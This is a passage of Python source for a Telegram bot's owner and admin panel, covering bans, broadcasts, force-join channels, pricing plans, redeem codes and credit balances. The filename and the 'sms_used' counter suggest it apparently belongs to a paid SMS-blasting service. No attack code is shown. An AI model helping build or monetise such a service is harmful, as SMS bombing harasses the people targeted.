    text, markup = users_list_kb(d, prefix, 0)
    await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")


@R.callback_query(F.data == "owner:users:search")
async def owner_users_search_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.search_user_balance)
    await cq.message.edit_text(
        f"{DIVIDER}\n🔎 <b>sᴇᴀʀᴄʜ ᴜsᴇʀ ʙᴀʟᴀɴᴄᴇ</b>\n{DIVIDER}\n\n"
        f"User ID ya @username bhejein:",
        reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "owner:users:list")]), parse_mode="HTML"
    )


@R.message(S.search_user_balance)
async def owner_users_search_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    uid = find_user_id(msg.text, d)
    if uid is None:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} User nahi mila. Exact ID ya saved @username bhejein.", parse_mode="HTML")
        return
    await state.clear()
    await msg.answer(
        user_balance_text(uid, d),
        reply_markup=kb([
            ("➕ ᴀᴅᴅ", f"owner:user:credit:add:{uid}"),
            ("➖ ʀᴇᴍᴏᴠᴇ", f"owner:user:credit:remove:{uid}"),
            ("✏️ sᴇᴛ", f"owner:user:credit:set:{uid}"),
            ("ʙᴀᴄᴋ", "owner:users:list")
        ]), parse_mode="HTML"
    )


@R.callback_query(F.data.regexp(r"^(owner|admin):users:pg:(\d+)$"))
async def panel_users_page(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    parts = cq.data.split(":")
    prefix = parts[0]
    page = int(parts[3])
    text, markup = users_list_kb(d, prefix, page)
    await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")


@R.callback_query(F.data.in_({"owner:ban", "admin:ban"}))
async def panel_ban_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    await state.set_state(S.ban_user)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await cq.message.edit_text(
        f"{em(EMOJI_CROSS, '🚫')} <b>ʙᴀɴ ᴜsᴇʀ</b>\n\nUser ID bhejo:",
        reply_markup=kb([("ᴄᴀɴᴄᴇʟ", back)]),
        parse_mode="HTML"
    )


@R.message(S.ban_user)
async def panel_ban_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    try:
        ban_id = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID!", parse_mode="HTML")
        return
    if is_owner(ban_id, d) or is_admin(ban_id, d):
        await state.clear()
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Admin/Owner ko nahi!", parse_mode="HTML")
        return
    if ban_id not in d.get("banned", []):
        d.setdefault("banned", []).append(ban_id)
        save(d)
    await state.clear()
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await msg.answer(f"{em(EMOJI_CROSS, '🚫')} <b>Banned!</b>\n<code>{ban_id}</code>", reply_markup=back_kb, parse_mode="HTML")
    try:
        await msg.bot.send_message(ban_id, f"{em(EMOJI_CROSS, '🚫')} Aapko ban kar diya gaya.", parse_mode="HTML")
    except: pass


@R.callback_query(F.data.in_({"owner:unban:menu", "admin:unban:menu"}))
async def panel_unban_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    banned = d.get("banned", [])
    if not banned:
        await cq.answer("✅ Koi banned nahi!", show_alert=True)
        return
    prefix = "owner" if is_owner(cq.from_user.id, d) else "admin"
    await cq.message.edit_text(
        f"{em(EMOJI_CHECK, '🔓')} <b>ᴜɴʙᴀɴ ᴜsᴇʀ</b>\n\nBanned: <b>{len(banned)}</b>",
        reply_markup=unban_menu_kb(d, prefix),
        parse_mode="HTML"
    )


@R.callback_query(F.data.regexp(r"^(owner|admin):unban:do:(\d+)$"))
async def panel_unban_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    ban_id = int(cq.data.split(":")[-1])
    if ban_id in d.get("banned", []):
        d["banned"].remove(ban_id)
        save(d)
    await cq.answer(f"✅ Unbanned!", show_alert=True)
    back_text = owner_panel_text(d) if is_owner(uid, d) else admin_panel_text(d)
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await cq.message.edit_text(back_text, reply_markup=back_kb, parse_mode="HTML")
    try:
        await cq.bot.send_message(ban_id, f"{em(EMOJI_CHECK, '✅')} Aapka ban hata diya!", parse_mode="HTML")
    except: pass


# ============================================================
# BROADCAST
# ============================================================

@R.callback_query(F.data == "owner:broadcast")
async def panel_broadcast_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.broadcast)
    back = "owner:home"
    await cq.message.edit_text(
        f"{em(EMOJI_BELL, '📢')} <b>ʙʀᴏᴀᴅᴄᴀsᴛ</b>\n\nMessage bhejo:",
        reply_markup=kb([("ᴄᴀɴᴄᴇʟ", back)]),
        parse_mode="HTML"
    )


@R.message(S.broadcast)
async def panel_broadcast_do(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    await state.clear()
    users = d.get("users", {})
    wait = await msg.answer(
        f"{DIVIDER}\n{em(EMOJI_BELL, '📤')} <b>ʙʀᴏᴀᴅᴄᴀsᴛ sᴛᴀʀᴛᴇᴅ</b>\n{DIVIDER}\n\n"
        f"Registered users: <b>{len(users)}</b>", parse_mode="HTML"
    )
    ok = 0
    fail = 0
    for uid_str in users:
        try:
            target = int(uid_str)
            if msg.text:
                bcast_text = f"{em(EMOJI_BELL, '📢')} <b>Broadcast</b>\n\n{msg.text}"
                await msg.bot.send_message(target, bcast_text, parse_mode="HTML")
            else:
                await msg.copy_to(target)
            ok += 1
        except Exception:
            fail += 1
        await asyncio.sleep(0.05)
    await wait.delete()
    await msg.answer(
        f"{DIVIDER}\n{em(EMOJI_CHECK, '✅')} <b>ʙʀᴏᴀᴅᴄᴀsᴛ ᴄᴏᴍᴘʟᴇᴛᴇ</b>\n{DIVIDER}\n\n"
        f"✅ Delivered: <b>{ok}</b>\n"
        f"❌ Failed: <b>{fail}</b>\n"
        f"📊 Total: <b>{len(users)}</b>\n{DIVIDER}",
        reply_markup=owner_kb(d), parse_mode="HTML"
    )


# ============================================================
# EXPORT SCRIPT
# ============================================================

@R.callback_query(F.data == "owner:export_script")
async def owner_export_script(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await cq.answer("📤 Exporting...")
    try:
        script_path = os.path.abspath(__file__)
        if not os.path.exists(script_path):
            script_path = "blast_bot_v3.4_premium.py"
        await cq.message.reply_document(
            document=FSInputFile(script_path),
            caption=f"{em(EMOJI_GEAR, '📤')} <b>Script Export</b> — <i>{_VERSION}</i>",
            parse_mode="HTML"
        )
    except Exception as e:
        await cq.answer(f"❌ Failed: {str(e)[:40]}", show_alert=True)


# ============================================================
# ADMIN HOME
# ============================================================

@R.callback_query(F.data.in_({"admin:home", "admin:refresh"}))
async def admin_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin Only!", show_alert=True)
        return
    try:
        await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
    except TelegramBadRequest: pass


# ============================================================
# FORCE JOIN
# ============================================================

@R.callback_query(F.data == "owner:fj:menu")
async def owner_fj_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    fj = d.get("force_join", {})
    channels = fj.get("channels", [])
    status = f"{em(EMOJI_CHECK, '🟢')} ON" if fj.get("enabled") else f"{em(EMOJI_CROSS, '🔴')} OFF"
    text = f"{em(EMOJI_BELL, '🔗')} <b>ғᴏʀᴄᴇ ᴊᴏɪɴ</b>\n\nStatus: {status}\nChannels: <b>{len(channels)}</b>\n\n"
    for ch in channels:
        text += f"• {ch.get('title', 'Channel')} (<code>{ch['id']}</code>)\n"
    rows = [
        [btn("ᴀᴅᴅ ᴄʜᴀɴɴᴇʟ", "owner:fj:add", EMOJI_CHECK, "➕", style="success")],
        [btn("ʀᴇᴍᴏᴠᴇ ᴄʜᴀɴɴᴇʟ", "owner:fj:remove", EMOJI_CROSS, "🗑", style="danger")],
        [btn("ᴇɴᴀʙʟᴇ" if not fj.get("enabled") else "ᴅɪsᴀʙʟᴇ",
             "owner:fj:toggle", EMOJI_CHECK if not fj.get("enabled") else EMOJI_CROSS,
             "🟢" if not fj.get("enabled") else "🔴",
             style="success" if not fj.get("enabled") else "danger")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")


@R.callback_query(F.data == "owner:fj:add")
async def owner_fj_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.fj_add_channel)
    await cq.message.edit_text(
        f"{em(EMOJI_BELL, '🔗')} <b>ᴀᴅᴅ ᴄʜᴀɴɴᴇʟ</b>\n\n{sc('step 1/2')}: Channel ID bhejo:",
        reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "owner:fj:menu")]),
        parse_mode="HTML"
    )


@R.message(S.fj_add_channel)
async def owner_fj_add_channel(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        ch_id = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID!", parse_mode="HTML")
        return
    await state.update_data(fj_channel_id=ch_id)
    await state.set_state(S.fj_add_link)
    await msg.answer(
        f"{em(EMOJI_BELL, '🔗')} <b>{sc('step 2/2')}</b>\n\nInvite link bhejo:",
        reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "owner:fj:menu")]),
        parse_mode="HTML"
    )


@R.message(S.fj_add_link)
async def owner_fj_add_link(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    link = msg.text.strip()
    if not link.startswith("http"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid link!", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    ch_id = str(fsmd.get("fj_channel_id"))
    try:
        chat = await msg.bot.get_chat(int(ch_id))
        title = chat.title or "Channel"
    except:
        title = "Channel"
    channels = d.setdefault("force_join", {}).setdefault("channels", [])
    channels = [c for c in channels if str(c["id"]) != ch_id]
    channels.append({"id": ch_id, "link": link, "title": title, "required": True})
    d["force_join"]["channels"] = channels
    save(d)
    await state.clear()
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} <b>Added!</b>\n{title}", reply_markup=kb([("ʙᴀᴄᴋ", "owner:fj:menu")]), parse_mode="HTML")


@R.callback_query(F.data == "owner:fj:remove")
async def owner_fj_remove_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    channels = d.get("force_join", {}).get("channels", [])
    if not channels:
        await cq.answer("❌ Koi channel nahi!", show_alert=True)
        return
    rows = []
    for ch in channels:
        rows.append([btn(ch.get('title', 'Channel')[:25], f"owner:fj:del:{ch['id']}", EMOJI_CROSS, "🗑", style="danger")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:fj:menu", EMOJI_GEAR, "🔙", style="primary")])
    await cq.message.edit_text(f"{em(EMOJI_CROSS, '🗑')} <b>ʀᴇᴍᴏᴠᴇ ᴄʜᴀɴɴᴇʟ</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")


@R.callback_query(F.data.startswith("owner:fj:del:"))
async def owner_fj_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    ch_id = cq.data.split("owner:fj:del:", 1)[1]
    channels = d.get("force_join", {}).get("channels", [])
    d["force_join"]["channels"] = [c for c in channels if str(c["id"]) != ch_id]
    save(d)
    await cq.answer("🗑 Removed!")
    await owner_fj_menu(cq, state)


@R.callback_query(F.data == "owner:fj:toggle")
async def owner_fj_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    fj = d.setdefault("force_join", {})
    fj["enabled"] = not fj.get("enabled", False)
    save(d)
    await cq.answer(f"Force Join {'ENABLED' if fj['enabled'] else 'DISABLED'}!", show_alert=True)
    await owner_fj_menu(cq, state)


# ============================================================
# PRICING
# ============================================================

@R.callback_query(F.data == "owner:pricing:menu")
async def owner_pricing_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    plans = d.get("pricing", {}).get("plans", [])
    text = f"{em(EMOJI_MONEY, '💳')} <b>ᴘʀɪᴄɪɴɢ ᴘʟᴀɴs</b>\n\nTotal: <b>{len(plans)}</b>\n\n"
    for i, plan in enumerate(plans, 1):
        text += f"{i}. <b>{plan['name']}</b> — {plan['price']} INR = {plan['credits']} credits\n"
    rows = [
        [btn("ᴀᴅᴅ ᴘʟᴀɴ", "owner:pricing:add", EMOJI_CHECK, "➕", style="success")],
        [btn("ʀᴇᴍᴏᴠᴇ ᴘʟᴀɴ", "owner:pricing:remove", EMOJI_CROSS, "🗑", style="danger")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")


@R.callback_query(F.data == "owner:pricing:add")
async def owner_pricing_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_plan_name)
    await cq.message.edit_text(f"{em(EMOJI_MONEY, '💳')} <b>{sc('step 1/4')}</b>: Plan name bhejo:", reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "owner:pricing:menu")]), parse_mode="HTML")


@R.message(S.add_plan_name)
async def owner_pricing_name(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    await state.update_data(plan_name=msg.text.strip())
    await state.set_state(S.add_plan_price)
    await msg.answer(f"{em(EMOJI_MONEY, '💳')} <b>{sc('step 2/4')}</b>: Price bhejo:", reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "owner:pricing:menu")]), parse_mode="HTML")


@R.message(S.add_plan_price)
async def owner_pricing_price(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        price = float(msg.text.strip())
        await state.update_data(plan_price=price)
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid price!", parse_mode="HTML")
        return
    await state.set_state(S.add_plan_credits)
    await msg.answer(f"{em(EMOJI_MONEY, '💳')} <b>{sc('step 3/4')}</b>: Credits bhejo:", reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "owner:pricing:menu")]), parse_mode="HTML")


@R.message(S.add_plan_credits)
async def owner_pricing_credits(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        credits = int(msg.text.strip())
        await state.update_data(plan_credits=credits)
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number!", parse_mode="HTML")
        return
    await state.set_state(S.add_plan_link)
    await msg.answer(f"{em(EMOJI_MONEY, '💳')} <b>{sc('step 4/4')}</b>: Payment link bhejo:", reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "owner:pricing:menu")]), parse_mode="HTML")


@R.message(S.add_plan_link)
async def owner_pricing_link(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    link = msg.text.strip()
    if not link.startswith("http"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid URL!", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    plan = {
        "id": str(int(time.time())),
        "name": fsmd.get("plan_name", "Plan"),
        "price": fsmd.get("plan_price", 0),
        "credits": fsmd.get("plan_credits", 0),
        "currency": "INR",
        "payment_link": link
    }
    d.setdefault("pricing", {}).setdefault("plans", []).append(plan)
    save(d)
    await state.clear()
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} <b>Plan Added!</b>", reply_markup=kb([("ʙᴀᴄᴋ", "owner:pricing:menu")]), parse_mode="HTML")


@R.callback_query(F.data == "owner:pricing:remove")
async def owner_pricing_remove(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    plans = d.get("pricing", {}).get("plans", [])
    if not plans:
        await cq.answer("❌ Koi plan nahi!", show_alert=True)
        return
    rows = []
    for plan in plans:
        rows.append([btn(plan['name'][:25], f"owner:pricing:del:{plan['id']}", EMOJI_CROSS, "🗑", style="danger")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:pricing:menu", EMOJI_GEAR, "🔙", style="primary")])
    await cq.message.edit_text(f"{em(EMOJI_CROSS, '🗑')} <b>ʀᴇᴍᴏᴠᴇ ᴘʟᴀɴ</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")


@R.callback_query(F.data.startswith("owner:pricing:del:"))
async def owner_pricing_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    plan_id = cq.data.split("owner:pricing:del:", 1)[1]
    plans = d.get("pricing", {}).get("plans", [])
    d["pricing"]["plans"] = [p for p in plans if p["id"] != plan_id]
    save(d)
    await cq.answer("🗑 Removed!")
    await owner_pricing_menu(cq, state)


# ============================================================
# REDEEM CODES
# ============================================================

@R.callback_query(F.data == "owner:redeem:menu")
async def owner_redeem_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    codes = d.get("redeem_codes", {})
    text = f"{em(EMOJI_GIFT, '🎁')} <b>ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇs</b>\n\nTotal: <b>{len(codes)}</b>\n\n"
    for code, data in list(codes.items())[:10]:
        status = f"{em(EMOJI_CHECK, '✅')}" if data.get("uses_left", 0) > 0 else f"{em(EMOJI_CROSS, '❌')}"
        text += f"{status} <code>{code}</code> — {data['credits']} ({data.get('uses_left', 0)} left)\n"
    rows = [
        [btn("ɢᴇɴᴇʀᴀᴛᴇ", "owner:redeem:gen", EMOJI_CHECK, "➕", style="success")],
        [btn("ᴅᴇʟᴇᴛᴇ", "owner:redeem:del", EMOJI_CROSS, "🗑", style="danger")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")


@R.callback_query(F.data == "owner:redeem:gen")
async def owner_redeem_gen_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.gen_redeem_credits)
    await cq.message.edit_text(f"{em(EMOJI_GIFT, '🎁')} <b>{sc('step 1/2')}</b>: Credits amount?", reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "owner:redeem:menu")]), parse_mode="HTML")


@R.message(S.gen_redeem_credits)
async def owner_redeem_credits(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        credits = int(msg.text.strip())
        if credits < 1:
            raise ValueError
        await state.update_data(gen_credits=credits)
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number!", parse_mode="HTML")
        return
    await state.set_state(S.gen_redeem_uses)
    await msg.answer(f"{em(EMOJI_GIFT, '🎁')} <b>{sc('step 2/2')}</b>: Max uses?", reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "owner:redeem:menu")]), parse_mode="HTML")


@R.message(S.gen_redeem_uses)
async def owner_redeem_uses(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        uses = int(msg.text.strip())
        if uses < 1: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number!", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    credits = fsmd.get("gen_credits", 10)
    while True:
        code = "GIFT" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        if code not in d.get("redeem_codes", {}): break
    d.setdefault("redeem_codes", {})[code] = {
        "credits": credits, "uses_left": uses, "created_by": msg.from_user.id,
        "created_at": int(time.time()), "used_by": []
    }
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_GIFT, '🎉')} <b>Code Generated!</b>\n\n<code>{code}</code>\n💰 {credits}\n🔢 {uses}",
        reply_markup=kb([("ʙᴀᴄᴋ", "owner:redeem:menu")]),
        parse_mode="HTML"
    )


@R.callback_query(F.data == "owner:redeem:del")
async def owner_redeem_del_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    codes = d.get("redeem_codes", {})
    if not codes:
        await cq.answer("❌ Koi code nahi!", show_alert=True)
        return
    rows = []
    for code in list(codes.keys())[:20]:
        rows.append([btn(code, f"owner:redeem:deldo:{code}", EMOJI_CROSS, "🗑", style="danger")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:redeem:menu", EMOJI_GEAR, "🔙", style="primary")])
    await cq.message.edit_text(f"{em(EMOJI_CROSS, '🗑')} <b>ᴅᴇʟᴇᴛᴇ ᴄᴏᴅᴇ</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")


@R.callback_query(F.data.startswith("owner:redeem:deldo:"))
async def owner_redeem_del_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    code = cq.data.split("owner:redeem:deldo:", 1)[1]
    if code in d.get("redeem_codes", {}):
        del d["redeem_codes"][code]
        save(d)
    await cq.answer("🗑 Deleted!")
    await owner_redeem_menu(cq, state)


@R.callback_query(F.data.startswith("owner:user:balance:"))
async def owner_user_balance_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    uid = int(cq.data.rsplit(":", 1)[1])
    if str(uid) not in d.get("users", {}):
        await cq.answer("User not found!", show_alert=True)
        return
    await cq.message.edit_text(
        user_balance_text(uid, d),
        reply_markup=kb([
            ("➕ ᴀᴅᴅ", f"owner:user:credit:add:{uid}"),
            ("➖ ʀᴇᴍᴏᴠᴇ", f"owner:user:credit:remove:{uid}"),
            ("✏️ sᴇᴛ", f"owner:user:credit:set:{uid}"),
            ("ʙᴀᴄᴋ", "owner:users:list")
        ]), parse_mode="HTML"
    )


@R.callback_query(F.data.regexp(r"^owner:user:credit:(add|remove|set):(\d+)$"))
async def owner_user_credit_action(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    action, uid_text = cq.data.split(":")[3:5]
    uid = int(uid_text)
    await state.update_data(manage_uid=uid, manage_action=action)
    await state.set_state(S.manage_user_credits)
    await cq.message.edit_text(
        f"{DIVIDER}\n💰 <b>{action.upper()} USER CREDITS</b>\n{DIVIDER}\n\n"
        f"User: <code>{uid}</code>\nAmount bhejein:",
        reply_markup=kb([("ᴄᴀɴᴄᴇʟ", f"owner:user:balance:{uid}")]), parse_mode="HTML"
    )


@R.message(S.manage_user_credits)
async def owner_user_credit_action_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        amount = int((msg.text or "").strip())
        if amount < 0: raise ValueError
    except (TypeError, ValueError):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Positive number bhejein.", parse_mode="HTML")
        return
    data = await state.get_data()
    uid = int(data.get("manage_uid"))
    action = data.get("manage_action")
    user = d.get("users", {}).get(str(uid))
    if not user:
        await state.clear()
        await msg.answer("User not found!", parse_mode="HTML")
        return
    if action == "add":
        user["credits"] = int(user.get("credits", 0)) + amount
    elif action == "remove":
        user["credits"] = max(0, int(user.get("credits", 0)) - amount)
        user["sms_used"] = 0
    else:
        user["credits"] = amount
        user["sms_used"] = 0
    save(d)
    await state.clear()
    await msg.answer(user_balance_text(uid, d), reply_markup=kb([("ʙᴀᴄᴋ", "owner:users:list")]), parse_mode="HTML")


# ============================================================
# ADD / DEDUCT CREDITS
# ============================================================

@R.callback_query(F.data == "owner:credits:add")
async def owner_credits_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_credits_uid)
    await cq.message.edit_text(f"{em(EMOJI_MONEY, '💰')} <b>ᴀᴅᴅ ᴄʀᴇᴅɪᴛs</b>\n\n{sc('step 1/2')}: User ID bhejo:", reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "owner:home")]), parse_mode="HTML")


@R.message(S.add_credits_uid)
async def owner_credits_add_uid(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        uid = int(msg.text.strip())
        await state.update_data(credit_uid=uid)
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID!", parse_mode="HTML")
        return
    await state.set_state(S.add_credits_amount)
    await msg.answer(f"{em(EMOJI_MONEY, '💰')} <b>{sc('step 2/2')}</b>: Amount?", reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "owner:home")]), parse_mode="HTML")


@R.message(S.add_credits_amount)
async def owner_credits_add_amount(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        amount = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number!", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    uid = fsmd.get("credit_uid")
    add_credits(uid, amount, d)
    save(d)
    await state.clear()
    try:
        await msg.bot.send_message(uid, f"{em(EMOJI_MONEY, '💰')} <b>+{amount} credits!</b>", parse_mode="HTML")
    except: pass
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} <b>+{amount}</b> to <code>{uid}</code>\nBalance: <b>{get_user_credits(uid, d)}</b>", reply_markup=kb([("ʙᴀᴄᴋ", "owner:home")]), parse_mode="HTML")


@R.callback_query(F.data == "owner:credits:deduct")
async def owner_credits_deduct_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.deduct_credits_uid)
    await cq.message.edit_text(f"{em(EMOJI_MONEY, '💰')} <b>ᴅᴇᴅᴜᴄᴛ ᴄʀᴇᴅɪᴛs</b>\n\n{sc('step 1/2')}: User ID bhejo:", reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "owner:home")]), parse_mode="HTML")


@R.message(S.deduct_credits_uid)
async def owner_credits_deduct_uid(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        uid = int(msg.text.strip())
        await state.update_data(deduct_uid=uid)
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID!", parse_mode="HTML")
        return
    await state.set_state(S.deduct_credits_amount)
    await msg.answer(f"{em(EMOJI_MONEY, '💰')} <b>{sc('step 2/2')}</b>: Amount?", reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "owner:home")]), parse_mode="HTML")


@R.message(S.deduct_credits_amount)
async def owner_credits_deduct_amount(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        amount = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number!", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    uid = fsmd.get("deduct_uid")
    success = deduct_credits(uid, amount, d)
    save(d)
    await state.clear()
    if success:
        try:
            await msg.bot.send_message(uid, f"{em(EMOJI_WARNING, '⚠️')} <b>-{amount} credits!</b>", parse_mode="HTML")
        except: pass
        await msg.answer(f"{em(EMOJI_CHECK, '✅')} <b>-{amount}</b> from <code>{uid}</code>\nBalance: <b>{get_user_credits(uid, d)}</b>", reply_markup=kb([("ʙᴀᴄᴋ", "owner:home")]), parse_mode="HTML")
    else:
